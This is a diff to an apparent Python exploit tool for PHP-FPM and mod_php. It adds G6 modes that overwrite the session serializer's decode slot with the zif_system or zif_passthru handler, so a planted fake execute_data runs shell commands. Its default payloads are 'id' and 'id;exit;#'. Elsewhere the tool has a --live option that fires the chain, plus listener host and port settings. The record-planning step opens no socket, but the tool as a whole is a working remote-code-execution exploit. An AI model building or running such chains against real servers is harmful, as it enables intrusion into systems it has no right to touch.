@@ -234,12 +234,13 @@ def run_leak_step(
 
 
 def run_g2_step(args) -> int:
-    """G2 FPM offline record plan: profile arithmetic plus record bytes.
+    """G2/G6 FPM offline record plan: profile arithmetic plus record bytes.
 
     No transport exists on this path: --live is refused with a JSON error. The
-    record is built from operator supplied X, P and B0 plus the fixed .data
-    decode slot or an explicit target. --step g2 never guesses an address and
-    never opens a socket.
+    php_binary record is built from operator supplied X, P and B0 plus the
+    fixed .data decode slot or an explicit target. The zif_system/zif_passthru
+    G6 modes additionally require X2, the second decode buffer. --step g2 never
+    guesses an address and never opens a socket.
     """
     if args.output is None:
         stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
@@ -249,6 +250,7 @@ def run_g2_step(args) -> int:
     if args.live:
         summary = {
             "step": "g2",
+            "decode": args.g2_decode,
             "dry_run": False,
             "sent": False,
             "error": "ValueError: --step g2 has no transport (offline record "
@@ -265,9 +267,13 @@ def run_g2_step(args) -> int:
             ("--g2-b0", args.g2_b0),
         ) if value is None
     ]
+    zif_mode = args.g2_decode in g2_chain_module.ZIF_DECODE_MODES
+    if zif_mode and args.g2_x2 is None:
+        missing.append("--g2-x2")
     if missing:
         summary = {
             "step": "g2",
+            "decode": args.g2_decode,
             "dry_run": True,
             "sent": False,
             "error": "ValueError: --step g2 requires " + ", ".join(missing)
@@ -278,14 +284,49 @@ def run_g2_step(args) -> int:
         print(rendered, end="")
         return 2
 
+    if not zif_mode and args.g2_x2 is not None:
+        summary = {
+            "step": "g2",
+            "decode": args.g2_decode,
+            "dry_run": True,
+            "sent": False,
+            "error": "ValueError: --g2-x2 applies only to --g2-decode "
+                     "zif_system or zif_passthru",
+        }
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        (args.output / "result.json").write_text(rendered)
+        print(rendered, end="")
+        return 2
+    if zif_mode and (args.g2_value is not None or args.libc_base is not None):
+        summary = {
+            "step": "g2",
+            "decode": args.g2_decode,
+            "dry_run": True,
+            "sent": False,
+            "error": "ValueError: --g2-value/--libc-base do not apply to a "
+                     "zif decode target; the written value is the profile "
+                     "zif handler address",
+        }
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        (args.output / "result.json").write_text(rendered)
+        print(rendered, end="")
+        return 2
+
+    if args.command is None:
+        command = "id" if zif_mode else "id;exit;#"
+    else:
+        command = args.command
+
     try:
         profile, profile_path = g2_chain_module.load_profile(args.g2_profile)
         emitted = g2_chain_module.plan(
             x=g2_chain_module.hex_int(args.g2_x, "--g2-x"),
+            x2=(g2_chain_module.hex_int(args.g2_x2, "--g2-x2")
+                if args.g2_x2 is not None else None),
             p=g2_chain_module.hex_int(args.g2_p, "--g2-p"),
             b0=g2_chain_module.hex_int(args.g2_b0, "--g2-b0"),
             total=args.g2_total,
-            command=args.command if args.command is not None else "id;exit;#",
+            command=command,
             value=args.g2_value,
             libc_base=(
                 g2_chain_module.hex_int(args.libc_base, "--libc-base")
@@ -295,10 +336,12 @@ def run_g2_step(args) -> int:
                 if args.g2_target is not None else None),
             profile=profile,
             profile_path=profile_path,
+            decode=args.g2_decode,
         )
     except (OSError, TypeError, ValueError) as error:
         summary = {
             "step": "g2",
+            "decode": args.g2_decode,
             "dry_run": True,
             "sent": False,
             "error": f"{type(error).__name__}: {error}",
@@ -663,7 +706,8 @@ def main() -> int:
         "byte-build default, --live to fire), --step write_stage (dry: final "
         "forged multipart bytes through the COMPACT engine, no send), --step leak "
         "(dry modphp calibration plan, no transport), --step g2 (offline FPM "
-        "php_binary record plan from explicit X, P and B0; no transport), or "
+        "G2 php_binary / G6 zif_system / zif_passthru record plan from explicit "
+        "X, X2, P and B0; no transport), or "
         "--step chain (modphp: ordered "
         "producer plus consumer sequence, dry default; fpm targets: legacy "
         "blocker-hold + rearm + forged staged multipart)"
@@ -685,8 +729,9 @@ def main() -> int:
     parser.add_argument(
         "--command",
         default=None,
-        help="chain command payload (default: id; --step g2 default: id;exit;# "
-             "padded to the 32 byte php_binary key)",
+        help="chain command payload (default: id; --step g2 defaults: "
+             "id;exit;# for php_binary, id for zif_system/zif_passthru; the "
+             "zif command must be NUL-free and is not 32-byte padded)",
     )
     parser.add_argument("--lhost", default="127.0.0.1")
     parser.add_argument("--lport", default=4444, type=int)
@@ -765,7 +810,22 @@ def main() -> int:
     parser.add_argument(
         "--g2-x",
         default=None,
-        help="--step g2: session record buffer zend_string X (hex)",
+        help="--step g2: first decode zend_string X1 (hex); the first "
+             "php_session_decode buffer (planted T1)",
+    )
+    parser.add_argument(
+        "--g2-x2",
+        default=None,
+        help="--step g2: second decode zend_string X2 (hex), required for "
+             "--g2-decode zif_system|zif_passthru; the re-encoded T2 buffer "
+             "holds the fake execute_data",
+    )
+    parser.add_argument(
+        "--g2-decode",
+        choices=g2_chain_module.DECODE_MODES,
+        default="php_binary",
+        help="--step g2 decode mode: php_binary (G2), zif_passthru (G6 clean "
+             "control) or zif_system (G6 one-shot); default php_binary",
     )
     parser.add_argument(
         "--g2-p",
@@ -793,18 +853,20 @@ def main() -> int:
         "--g2-target",
         default=None,
         help="--step g2: 16-byte aligned write target (default: the profile "
-             "ps_serializers[2].decode slot)",
+             "ps_serializers[2].decode slot); for zif modes this remains the "
+             "slot, while the written i:<n>; value is the profile zif address",
     )
     parser.add_argument(
         "--g2-value",
         default=None,
-        help="--step g2: serialized long written at the target "
-             "(default i:1;; ignored with --libc-base)",
+        help="--step g2 php_binary: serialized long written at the target "
+             "(default i:1;; ignored with --libc-base); rejected for zif modes",
     )
     parser.add_argument(
         "--libc-base",
         default=None,
-        help="--step g2: libc base, system = base + profile system offset",
+        help="--step g2 php_binary: libc base, system = base + profile system "
+             "offset; rejected for zif modes",
     )
 
 
